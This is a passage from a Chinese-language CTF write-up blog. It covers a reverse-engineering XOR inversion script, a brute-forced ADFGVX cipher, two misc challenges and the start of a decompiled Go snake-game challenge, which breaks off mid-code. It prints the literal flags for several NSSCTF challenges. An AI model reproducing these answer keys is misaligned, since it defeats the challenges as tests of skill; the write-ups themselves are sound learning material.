class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">now_num = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>然后化简逆向：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, </span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x81</span>, </span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># last = [0]*100</span></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     b1 = input[now_num]</span></span><br><span class="line"><span class="comment">#     now_num += 1</span></span><br><span class="line"><span class="comment">#     b2 = input[now_num]</span></span><br><span class="line"><span class="comment">#     or_num = b1 | b2</span></span><br><span class="line"><span class="comment">#     not_1 = ~b1</span></span><br><span class="line"><span class="comment">#     not_2 = ~b2</span></span><br><span class="line"><span class="comment">#     or_not_num = not_2 | not_1</span></span><br><span class="line"><span class="comment">#     last[now_num - 1] = or_not_num &amp; or_num</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     save = last[now_num]</span></span><br><span class="line"><span class="comment">#     now_num+=1</span></span><br><span class="line"><span class="comment">#     last[now_num-1] = now_num + save - 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]-=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]^=last[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment">#NSSCTF&#123;H@ppy_Ch1ne5_NEwY3ar!1!1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="crypto">crypto</h2><h3 id="过年来下棋">过年来下棋</h3><p>XXVAF AVXAX DXFVX DXDVA XAGV</p><p>很明显是棋盘密码ADFGVX</p><p>根据密文段数发现是key为5位</p><p>写脚本穷举：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">4h9343nse2r4</span>: abcde</span><br><span class="line"><span class="attribute">4gl393mgewr8</span>: abced</span><br><span class="line"><span class="attribute">4h9343ise2rf</span>: abdce</span><br><span class="line"><span class="attribute">44lz934mbwr2</span>: abdec</span><br><span class="line"><span class="attribute">4bl393cgd2r3</span>: abecd</span><br><span class="line"><span class="attribute">4fl3l3fmdkr2</span>: abedc</span><br><span class="line"><span class="attribute">5b98405sy2r4</span>: acbde</span><br><span class="line"><span class="attribute">5al8904gywr8</span>: acbed</span><br><span class="line"><span class="attribute">5g99y0ls2erf</span>: acdbe</span><br><span class="line"><span class="attribute">94fh8344nsq2</span>: acdeb</span><br><span class="line"><span class="attribute">5al930fg1er3</span>: acebd</span><br><span class="line"><span class="attribute">9fflk3f4pgq2</span>: acedb</span><br><span class="line"><span class="attribute">5b984z6sy2m9</span>: adbce</span><br><span class="line"><span class="attribute">9alk934mgwq8</span>: adbec</span><br><span class="line"><span class="attribute">5g99yzrs2em9</span>: adcbe</span><br><span class="line"><span class="attribute">94fh8344isq2</span>: adceb</span><br><span class="line"><span class="attribute">9all33fmjeq3</span>: adebc</span><br><span class="line"><span class="attribute">9fflk3f4jmq2</span>: adecb</span><br><span class="line"><span class="attribute">4bl89y6gs2q9</span>: aebcd</span><br><span class="line"><span class="attribute">4fl8ly9mskq8</span>: aebdc</span><br><span class="line"><span class="attribute">4gl93yrgweq9</span>: aecbd</span><br><span class="line"><span class="attribute">49f5ky94ugq2</span>: aecdb</span><br><span class="line"><span class="attribute">44l53y9mteq3</span>: aedbc</span><br><span class="line"><span class="attribute">49f5ky94tmq2</span>: aedcb</span><br><span class="line"><span class="attribute">fh8948nse264</span>: bacde</span><br><span class="line"><span class="attribute">fgk998mgew68</span>: baced</span><br><span class="line"><span class="attribute">fh8948ise26f</span>: badce</span><br><span class="line"><span class="attribute">f4k5984mbw62</span>: badec</span><br><span class="line"><span class="attribute">fbk998cgd263</span>: baecd</span><br><span class="line"><span class="attribute">ffk9l8fmdk62</span>: baedc</span><br><span class="line"><span class="attribute">b58946zsy29m</span>: bcade</span><br><span class="line"><span class="attribute">b4k996ygyw9q</span>: bcaed</span><br><span class="line"><span class="attribute">bl8946ks2e9c</span>: bcdae</span><br><span class="line"><span class="attribute">r44h9343nse2</span>: bcdea</span><br><span class="line"><span class="attribute">bfk996eg1e90</span>: bcead</span><br><span class="line"><span class="attribute">rf4ll3f3pge2</span>: bceda</span><br><span class="line"><span class="attribute">b589450sy24r</span>: bdace</span><br><span class="line"><span class="attribute">f4kl99ymgw8q</span>: bdaec</span><br><span class="line"><span class="attribute">bl8945qs2e46</span>: bdcae</span><br><span class="line"><span class="attribute">r44h9343ise2</span>: bdcea</span><br><span class="line"><span class="attribute">ffkl99emje80</span>: bdeac</span><br><span class="line"><span class="attribute">rf4ll3f3jme2</span>: bdeca</span><br><span class="line"><span class="attribute">a5k9940gs28r</span>: beacd</span><br><span class="line"><span class="attribute">a9k9l43msk8q</span>: beadc</span><br><span class="line"><span class="attribute">alk994qgwe86</span>: becad</span><br><span class="line"><span class="attribute">m945ly93uge2</span>: becda</span><br><span class="line"><span class="attribute">a9k5948mte80</span>: bedac</span><br><span class="line"><span class="attribute">m945ly93tme2</span>: bedca</span><br><span class="line"><span class="attribute">lb984q5wa264</span>: cabde</span><br><span class="line"><span class="attribute">lal89q4kaw68</span>: cabed</span><br><span class="line"><span class="attribute">lg99yqlwee6f</span>: cadbe</span><br><span class="line"><span class="attribute">94b58846bs02</span>: cadeb</span><br><span class="line"><span class="attribute">lal93qfkde63</span>: caebd</span><br><span class="line"><span class="attribute">9fb9k8f6dg02</span>: caedb</span><br><span class="line"><span class="attribute">g5934rzwa29m</span>: cbade</span><br><span class="line"><span class="attribute">g4l39rykaw9q</span>: cbaed</span><br><span class="line"><span class="attribute">gl934rkwee9c</span>: cbdae</span><br><span class="line"><span class="attribute">645b98405sy2</span>: cbdea</span><br><span class="line"><span class="attribute">gfl39rekde90</span>: cbead</span><br><span class="line"><span class="attribute">6f5fl8f07gy2</span>: cbeda</span><br><span class="line"><span class="attribute">h499yn3wye4r</span>: cdabe</span><br><span class="line"><span class="attribute">94bl89y6gs2q</span>: cdaeb</span><br><span class="line"><span class="attribute">hf984n8wye46</span>: cdbae</span><br><span class="line"><span class="attribute">9m5g99y0ls2e</span>: cdbea</span><br><span class="line"><span class="attribute">9fbl89e6ja20</span>: cdeab</span><br><span class="line"><span class="attribute">9c5lf9e0j42y</span>: cdeba</span><br><span class="line"><span class="attribute">g4l93m3kse8r</span>: ceabd</span><br><span class="line"><span class="attribute">49b9k436sg2q</span>: ceadb</span><br><span class="line"><span class="attribute">gfl89m8kse86</span>: cebad</span><br><span class="line"><span class="attribute">4r54l430xg2e</span>: cebda</span><br><span class="line"><span class="attribute">49b58486ta20</span>: cedab</span><br><span class="line"><span class="attribute">4655f480t42y</span>: cedba</span><br><span class="line"><span class="attribute">lb984k6wa2c9</span>: dabce</span><br><span class="line"><span class="attribute">9ah8984naw08</span>: dabec</span><br><span class="line"><span class="attribute">lg99ykrweec9</span>: dacbe</span><br><span class="line"><span class="attribute">94b58845cs02</span>: daceb</span><br><span class="line"><span class="attribute">9ah938fnde03</span>: daebc</span><br><span class="line"><span class="attribute">9fb9k8f5dm02</span>: daecb</span><br><span class="line"><span class="attribute">g5934l0wa2fr</span>: dbace</span><br><span class="line"><span class="attribute">44h399ynaw3q</span>: dbaec</span><br><span class="line"><span class="attribute">gl934lqweef6</span>: dbcae</span><br><span class="line"><span class="attribute">645b984z6sy2</span>: dbcea</span><br><span class="line"><span class="attribute">4fh399ende30</span>: dbeac</span><br><span class="line"><span class="attribute">6f5fl8fz7my2</span>: dbeca</span><br><span class="line"><span class="attribute">h499yi3wyefr</span>: dcabe</span><br><span class="line"><span class="attribute">94bl89y5ms2q</span>: dcaeb</span><br><span class="line"><span class="attribute">hf984i8wyef6</span>: dcbae</span><br><span class="line"><span class="attribute">9m5g99yzrs2e</span>: dcbea</span><br><span class="line"><span class="attribute">9fbl89e5pa20</span>: dceab</span><br><span class="line"><span class="attribute">9c5lf9ezp42y</span>: dceba</span><br><span class="line"><span class="attribute">44h9343nse2r</span>: deabc</span><br><span class="line"><span class="attribute">49b9k435sm2q</span>: deacb</span><br><span class="line"><span class="attribute">4fh8948nse26</span>: debac</span><br><span class="line"><span class="attribute">4r54l43zxm2e</span>: debca</span><br><span class="line"><span class="attribute">49b58485ua20</span>: decab</span><br><span class="line"><span class="attribute">4655f48zu42y</span>: decba</span><br><span class="line"><span class="attribute">fbl89e6ja209</span>: eabcd</span><br><span class="line"><span class="attribute">ffl8le9pak08</span>: eabdc</span><br><span class="line"><span class="attribute">fgl93erjee09</span>: eacbd</span><br><span class="line"><span class="attribute">f9f5ke97cg02</span>: eacdb</span><br><span class="line"><span class="attribute">f4l53e9pbe03</span>: eadbc</span><br><span class="line"><span class="attribute">f9f5ke97bm02</span>: eadcb</span><br><span class="line"><span class="attribute">a5l39f0ja23r</span>: ebacd</span><br><span class="line"><span class="attribute">a9l3lf3pak3q</span>: ebadc</span><br><span class="line"><span class="attribute">all39fqjee36</span>: ebcad</span><br><span class="line"><span class="attribute">c99ble916gy2</span>: ebcda</span><br><span class="line"><span class="attribute">a9lz9f8pbe30</span>: ebdac</span><br><span class="line"><span class="attribute">c99ble915my2</span>: ebdca</span><br><span class="line"><span class="attribute">b4l93c3jye3r</span>: ecabd</span><br><span class="line"><span class="attribute">f9flkf37mg2q</span>: ecadb</span><br><span class="line"><span class="attribute">bfl89c8jye36</span>: ecbad</span><br><span class="line"><span class="attribute">fr9glf31rg2e</span>: ecbda</span><br><span class="line"><span class="attribute">f9fh8f87na20</span>: ecdab</span><br><span class="line"><span class="attribute">f69hff81n42y</span>: ecdba</span><br><span class="line"><span class="attribute">f4ll3f3pge2r</span>: edabc</span><br><span class="line"><span class="attribute">f9flkf37gm2q</span>: edacb</span><br><span class="line"><span class="attribute">fflk9f8pge26</span>: edbac</span><br><span class="line"><span class="attribute">fr9glf31lm2e</span>: edbca</span><br><span class="line"><span class="attribute">f9fh8f87ia20</span>: edcab</span><br><span class="line"><span class="attribute">f69hff81i42y</span>: edcba</span><br></pre></td></tr></table></figure><p>总不可能让我一个一个输吧。。看到题目</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新年快乐呀！来一起下象棋吧！我都摆好咯~ 祝愿大家在新的一年里 lucky！flag格式：NSSCTF&#123;<span class="strong">**字母小写**</span>&#125;</span><br></pre></td></tr></table></figure></blockquote><p>唯一的五位key盲猜lucky，那么NSSCTF{h499yn3wye4r}</p><h2 id="misc">misc</h2><h3 id="温馨的酒吧">温馨的酒吧</h3><p>看视频过完所有剧情即可拿flag</p><p>官方wp是遍历所有节点返回名字含flag的图片来得到的</p><p>注意有一段有5个乱码和中间正好一样，猜测：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;新年快乐_不要停下来啊_CTFer!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="userssssssssss">userssssssssss</h3><p>进入后按创建日期排序，最后是laminous，打开看到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;f9d04fc8-<span class="number">77</span>a6-<span class="number">4700</span>-b114-<span class="number">2</span>a071ff76ceb&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_r17题目复现</title>
      <link href="/posts/b3e0bfc3.html"/>
      <url>/posts/b3e0bfc3.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="snake">snake</h3><p>这个题是游戏题，相当于通关就可以得到最后的flag，可惜当时被go的抽象给蒙蔽了双眼，没有想去动调</p><p>逻辑大概是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">10</span>; i = v65 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v65 = i;</span><br><span class="line">    snake_pkg_app_Run(<span class="number">20</span>, <span class="number">20</span>, v0, v1, (_DWORD)v2, v3, v4, v5, v6, v57, v58);</span><br><span class="line">    v74 = v8;</span><br><span class="line">    v15 = runtime_convT64(v65, <span class="number">20</span>, v10, v1, (_DWORD)v2, v11, v12, v13, v14, v57);</span><br><span class="line">    *(_QWORD *)&amp;v74 = &amp;RTYPE_int;</span><br><span class="line">    *((_QWORD *)&amp;v74 + <span class="number">1</span>) = v15;</span><br><span class="line">    v1 = <span class="number">19</span>;</span><br><span class="line">    v2 = &amp;v74;</span><br><span class="line">    fmt_Fprintf(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%d Game round ends\n&quot;</span>,</span><br><span class="line">      <span class="number">19</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v74,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v16,</span><br><span class="line">      v17,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61,</span><br><span class="line">      v62,</span><br><span class="line">      v63);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> &amp;&amp; qword_569E78 == <span class="number">400</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v73[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">    v73[<span class="number">1</span>] = &amp;off_4E5D98;</span><br><span class="line">    v18 = <span class="number">1</span>;</span><br><span class="line">    LODWORD(v19) = <span class="number">1</span>;</span><br><span class="line">    fmt_Fprintln(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)v73,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v3,</span><br><span class="line">      v4,</span><br><span class="line">      v5,</span><br><span 